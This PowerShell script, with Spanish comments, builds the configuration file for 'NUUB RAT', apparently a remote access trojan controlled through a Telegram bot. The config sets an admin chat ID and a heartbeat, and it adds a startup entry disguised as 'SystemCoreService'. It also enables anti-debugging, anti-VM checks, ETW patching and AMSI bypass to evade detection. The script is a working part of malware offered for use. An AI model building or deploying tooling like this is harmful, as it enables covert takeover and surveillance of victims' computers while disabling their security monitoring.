<#
.SYNOPSIS
    NUUB RAT - Configuración rápida en una línea
.USO
    # Solo bot y token:
    .\quick_config.ps1 -Bot "123456:ABC" -Admin 123456789
    
    # Con PC ID personalizado:
    .\quick_config.ps1 -Bot "123456:ABC" -Admin 123456789 -PcId "MI-PC"
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$Bot,
    
    [Parameter(Mandatory=$true)]
    [long]$Admin,
    
    [string]$PcId = "PC-001"
)

$config = @{
    telegram_bot_token = $Bot
    admin_chat_id = $Admin
    admin_chat_ids = @($Admin)
    pc_identifier = $PcId
    encryption_password = -join ((1..24) | ForEach-Object { 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!'[(Get-Random -Maximum 55)] })
    master_log_filename = "log_master.txt"
    activity_log_filename = "activity_log.csv"
    audit_log_filename = "audit.log"
    auto_start_entry_name = "SystemCoreService"
    log_filename = "nuub.log"
    heartbeat_interval_minutes = 30
    c2_encryption_key = ""
    stealth_mode = $false
    anti_debug = $true
    anti_vm = $true
    etw_patch = $true
    amsi_bypass = $true
} | ConvertTo-Json

$config | Out-File "config.json" -Encoding UTF8

Write-Host "`n[OK] config.json creado" -ForegroundColor Green
Write-Host "  Bot:    $($Bot.Substring(0, [Math]::Min(10, $Bot.Length)))..."
Write-Host "  Admin:  $Admin"
Write-Host "  PC:     $PcId`n"
